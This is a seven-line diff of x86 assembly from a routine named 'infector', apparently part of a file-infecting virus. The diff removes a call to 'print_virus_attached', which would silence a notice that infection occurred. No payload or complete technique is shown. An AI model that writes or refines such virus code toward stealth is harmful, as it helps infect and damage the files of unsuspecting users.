@@ -114,7 +114,6 @@ infector:
     call system_call
     add esp, 16
 
-    call print_virus_attached
     popad
     add esp, 4
     pop ebp
